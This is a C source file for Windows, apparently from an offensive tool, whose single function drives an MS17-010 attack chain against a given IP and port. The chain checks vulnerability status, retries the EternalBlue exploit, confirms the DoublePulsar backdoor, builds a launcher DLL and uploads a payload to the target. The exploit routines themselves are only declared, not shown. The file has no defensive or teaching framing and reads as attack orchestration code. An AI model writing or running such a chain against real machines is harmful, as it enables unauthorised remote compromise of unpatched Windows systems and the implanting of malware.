#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <errno.h>
#include <ctype.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif
#define sock_close(fd) closesocket((SOCKET)(fd))

extern int ms17_vuln_status(const char *ip, int port);
extern int EternalBlue(const char *ip, int port);
extern int doublepulsar_check(const char *ip, int port);
extern int build_launcher_dll(const char *binary_path, const char *dll_out_path);
extern int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);
int execute_eternalblue(const char *ip, int port, const char *payload_path)
{
    int i;
    int result;
    (void)payload_path;
    printf("Step 1: Checking MS17-010 vulnerability on %s:%d\n", ip, port);
    if (ms17_vuln_status(ip, port) <= 0) {
        printf("Step 1 failed: target is not vulnerable\n");
        return -1;
    }
    printf("Step 1 complete: target is vulnerable\n");
    printf("Step 2: Attempting EternalBlue exploitation\n");
    for (i = 0; i < MAX_RETRIES; ++i) {
        printf("EternalBlue attempt %d of %d\n", i + 1, MAX_RETRIES);
        if (EternalBlue(ip, port) == 0) {
            printf("Step 2 complete: EternalBlue succeeded\n");
            break;
        }
    }
    if (i == MAX_RETRIES) {
        printf("Step 2 failed: all EternalBlue attempts failed\n");
        return -2;
    }
    printf("Step 3: Checking for DoublePulsar\n");
    if (doublepulsar_check(ip, port) <= 0) {
        printf("Step 3 failed: DoublePulsar is not active\n");
        return -3;
    }
    printf("Step 3 complete: DoublePulsar is active\n");
    printf("Step 4: Building launcher DLL\n");
    result = build_launcher_dll(TARGET_BINARY, PAYLOAD_DLL_PATH);
    if (result != 0) {
        printf("Step 4 failed: launcher DLL build failed\n");
        return -4;
    }
    printf("Step 4 complete: launcher DLL built\n");
    printf("Step 5: Uploading payload\n");
    result = upload_payload(ip, port, PAYLOAD_DLL_PATH, 1);
    if (result != 0) {
        printf("Step 5 failed: payload upload failed\n");
        return -5;
    }
    printf("Step 5 complete: payload uploaded\n");
    return 0;
}
